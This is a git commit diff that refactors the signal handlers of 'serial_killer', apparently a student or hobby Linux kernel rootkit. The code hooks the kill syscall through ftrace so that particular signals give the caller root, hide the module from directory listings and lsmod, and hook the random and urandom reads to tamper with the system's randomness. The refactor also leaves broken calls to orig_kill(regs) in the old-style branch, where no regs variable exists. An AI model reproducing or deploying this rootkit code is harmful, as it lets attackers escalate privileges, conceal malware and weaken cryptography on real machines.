032edbd5413c06255b9b1671f2312e9217612158
Gerald Lim Wee Koon <geraldlim619@gmail.com>
2022-11-28 20:24:40 -0800

    Refactored code in serial_killer.c

--- serial_killer/serial_killer.c
+++ serial_killer/serial_killer.c
@@ -27,6 +27,9 @@ static struct ftrace_hook hooks[];
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
 static asmlinkage int hook_kill(const struct pt_regs *regs);
+static int credential_handler_wrapper(int sig, pid_t pid);
+static int presence_handler_wrapper(int sig, pid_t pid);
+static int rng_handler_wrapper(int sig, pid_t pid);
 
 #else
 /* This is the old way of declaring a syscall hook */
@@ -44,11 +47,94 @@ static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents)
 };
 
+static int credential_handler_wrapper(int sig, pid_t pid){
+    if (pid == 1) {
+        printk(KERN_INFO "serial_killer: Giving Root...\n");
+        set_root();
+        has_taken_root = 1;
+        return 0;
+    } else if (pid == 0) {
+        printk(KERN_INFO "serial_killer: Resetting UID...\n");
+        unset_root();
+        return 0;
+    } else {
+        return 1;
+    }
+}
+
+static int presence_handler_wrapper(int sig, pid_t pid) {
+
+    int err;
+
+    if (pid == 0 && is_hidden == 0) {
+        printk(KERN_ERR "serial_killer: Already Exposed!\n");
+    } else if (pid == 0 && is_hidden == 1) {
+        printk(KERN_INFO "serial_killer: Exposing myself...\n");
+        fh_remove_hook(&hooks[3]);
+        fh_remove_hook(&hooks[4]);
+        show_lsmod();
+        is_hidden = 0;
+    } else if (pid == 1 && is_hidden == 0) {
+        printk(KERN_INFO "serial_killer: Hiding myself...\n");
+        err = fh_install_hook(&hooks[3]);
+        if (err) {
+            printk(KERN_DEBUG "install hook_getdents64 err value: %d\n", err);
+            return err;
+        }
+        err = fh_install_hook(&hooks[4]);
+        if (err) {
+            printk(KERN_DEBUG "install hook_getdents err value: %d\n", err);
+            fh_remove_hook(&hooks[3]);
+            return err;
+        }
+        hide_lsmod(); 
+        is_hidden = 1;
+    } else if (pid == 1 && is_hidden == 1) {
+        printk(KERN_ERR "serial_killer: Already Hidden!\n");
+    } else {
+        return 1;
+    }
+    return 0;
+}
+
+static int rng_handler_wrapper(int sig, pid_t pid) {
+
+    int err;
+
+    if (pid == 0 && is_random_active == 0) {
+        printk(KERN_ERR "serial_killer: RNG - Already Inactive!!\n");
+    } else if (pid == 0 && is_random_active == 1) {
+        printk(KERN_INFO "serial_killer: RNG - Deactivating...\n");
+        err = fh_install_hook(&hooks[1]);
+        if (err) {
+            printk(KERN_DEBUG "install hook_random_read err value: %d\n", err);
+            return err;
+        }
+        err = fh_install_hook(&hooks[2]);
+        if (err) {
+            printk(KERN_DEBUG "install hook_urandom_read err value: %d\n", err);
+            fh_remove_hook(&hooks[1]);
+            return err;
+        }
+        is_random_active = 0;
+    } else if (pid == 1 && is_random_active == 0) {
+        printk(KERN_INFO "serial_killer: RNG - Activating...\n");
+        fh_remove_hook(&hooks[1]);
+        fh_remove_hook(&hooks[2]);
+        is_random_active = 1;
+    } else if (pid == 1 && is_random_active == 1) {
+        printk(KERN_ERR "serial_killer: RNG - Already Active!");
+    } else {
+        return 1;
+    }
+    return 0;
+}
+
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage int hook_kill(const struct pt_regs *regs) {
     
     int sig = regs->si;
-    int pid = regs->di;
+    pid_t pid = regs->di;
     int err;
 
     if (has_taken_root == 0) {
@@ -59,77 +145,24 @@ static asmlinkage int hook_kill(const struct pt_regs *regs) {
 
          // Credentials Handler
         case 60: 
-            if (pid == 1) {
-                printk(KERN_INFO "serial_killer: Giving Root...\n");
-                set_root();
-                has_taken_root = 1;
-                return 0;
-            } else if (pid == 0) {
-                printk(KERN_INFO "serial_killer: Resetting UID...\n");
-                unset_root();
-                return 0;
-            } else {
+            err = credential_handler_wrapper(sig, pid);
+            if (err) {
                 return orig_kill(regs);
             }
+            return 0;
 
         // Presence Handler
         case 61:
-            if (pid == 0 && is_hidden == 0) {
-                printk(KERN_ERR "serial_killer: Already Exposed!\n");
-            } else if (pid == 0 && is_hidden == 1) {
-                printk(KERN_INFO "serial_killer: Exposing myself...\n");
-                fh_remove_hook(&hooks[3]);
-                fh_remove_hook(&hooks[4]);
-                show_lsmod();
-                is_hidden = 0;
-            } else if (pid == 1 && is_hidden == 0) {
-                printk(KERN_INFO "serial_killer: Hiding myself...\n");
-                err = fh_install_hook(&hooks[3]);
-                if (err) {
-                    printk(KERN_DEBUG "install hook_getdents64 err value: %d\n", err);
-                    return err;
-                }
-                err = fh_install_hook(&hooks[4]);
-                if (err) {
-                    printk(KERN_DEBUG "install hook_getdents err value: %d\n", err);
-                    fh_remove_hook(&hooks[3]);
-                    return err;
-                }
-                hide_lsmod(); 
-                is_hidden = 1;
-            } else if (pid == 1 && is_hidden == 1) {
-                printk(KERN_ERR "serial_killer: Already Hidden!\n");
-            } else {
+            err = presence_handler_wrapper(sig, pid);
+            if (err) {
                 return orig_kill(regs);
             }
             return 0;
         
         // RNG HANDLER
         case 62:
-            if (pid == 0 && is_random_active == 0) {
-                printk(KERN_ERR "serial_killer: RNG - Already Inactive!!\n");
-            } else if (pid == 0 && is_random_active == 1) {
-                printk(KERN_INFO "serial_killer: RNG - Deactivating...\n");
-                err = fh_install_hook(&hooks[1]);
-                if (err) {
-                    printk(KERN_DEBUG "install hook_random_read err value: %d\n", err);
-                    return err;
-                }
-                err = fh_install_hook(&hooks[2]);
-                if (err) {
-                    printk(KERN_DEBUG "install hook_urandom_read err value: %d\n", err);
-                    fh_remove_hook(&hooks[1]);
-                    return err;
-                }
-                is_random_active = 0;
-            } else if (pid == 1 && is_random_active == 0) {
-                printk(KERN_INFO "serial_killer: RNG - Activating...\n");
-                fh_remove_hook(&hooks[1]);
-                fh_remove_hook(&hooks[2]);
-                is_random_active = 1;
-            } else if (pid == 1 && is_random_active == 1) {
-                printk(KERN_ERR "serial_killer: RNG - Already Active!");
-            } else {
+            err = rng_handler_wrapper(sig, pid);
+            if (err) {
                 return orig_kill(regs);
             }
             return 0;
@@ -146,86 +179,33 @@ static asmlinkage int hook_kill(pid_t pid, int sig) {
         original_user = prepare_creds();
     }
 
-    switch (sig) {
+        switch (sig) {
 
          // Credentials Handler
         case 60: 
-            if (pid == 1) {
-                printk(KERN_INFO "serial_killer: Giving Root...\n");
-                set_root();
-                has_taken_root = 1;
-                return 0;
-            } else if (pid == 0) {
-                printk(KERN_INFO "serial_killer: Resetting UID...\n");
-                unset_root();
-                return 0;
-            } else {
-                return orig_kill(pid, sig);
+            err = credential_handler_wrapper(sig, pid);
+            if (err) {
+                return orig_kill(regs);
             }
+            return 0;
 
         // Presence Handler
         case 61:
-            if (pid == 0 && is_hidden == 0) {
-                printk(KERN_ERR "serial_killer: Already Exposed!\n");
-            } else if (pid == 0 && is_hidden == 1) {
-                printk(KERN_INFO "serial_killer: Exposing myself...\n");
-                fh_remove_hook(&hooks[3]);
-                fh_remove_hook(&hooks[4]);
-                show_lsmod();
-                is_hidden = 0;
-            } else if (pid == 1 && is_hidden == 0) {
-                printk(KERN_INFO "serial_killer: Hiding myself...\n");
-                err = fh_install_hook(&hooks[3]);
-                if (err) {
-                    printk(KERN_DEBUG "install hook_getdents64 err value: %d\n", err);
-                    return err;
-                }
-                err = fh_install_hook(&hooks[4]);
-                if (err) {
-                    printk(KERN_DEBUG "install hook_getdents err value: %d\n", err);
-                    fh_remove_hook(&hooks[3]);
-                    return err;
-                }
-                hide_lsmod(); 
-                is_hidden = 1;
-            } else if (pid == 1 && is_hidden == 1) {
-                printk(KERN_ERR "serial_killer: Already Hidden!\n");
-            } else {
-                return orig_kill(pid, sig);
+            err = presence_handler_wrapper(sig, pid);
+            if (err) {
+                return orig_kill(regs);
             }
             return 0;
         
         // RNG HANDLER
         case 62:
-            if (pid == 0 && is_random_active == 0) {
-                printk(KERN_ERR "serial_killer: RNG - Already Inactive!!\n");
-            } else if (pid == 0 && is_random_active == 1) {
-                printk(KERN_INFO "serial_killer: RNG - Deactivating...\n");
-                err = fh_install_hook(&hooks[1]);
-                if (err) {
-                    printk(KERN_DEBUG "install hook_random_read err value: %d\n", err);
-                    return err;
-                }
-                err = fh_install_hook(&hooks[2]);
-                if (err) {
-                    printk(KERN_DEBUG "install hook_urandom_read err value: %d\n", err);
-                    fh_remove_hook(&hooks[1]);
-                    return err;
-                }
-                is_random_active = 0;
-            } else if (pid == 1 && is_random_active == 0) {
-                printk(KERN_INFO "serial_killer: RNG - Activating...\n");
-                fh_remove_hook(&hooks[1]);
-                fh_remove_hook(&hooks[2]);
-                is_random_active = 1;
-            } else if (pid == 1 && is_random_active == 1) {
-                printk(KERN_ERR "serial_killer: RNG - Already Active!");
-            } else {
-                return orig_kill(pid, sig);
+            err = rng_handler_wrapper(sig, pid);
+            if (err) {
+                return orig_kill(regs);
             }
             return 0;
         default:
-            return orig_kill(pid, sig);
+            return orig_kill(regs);
     }
 }
 #endif
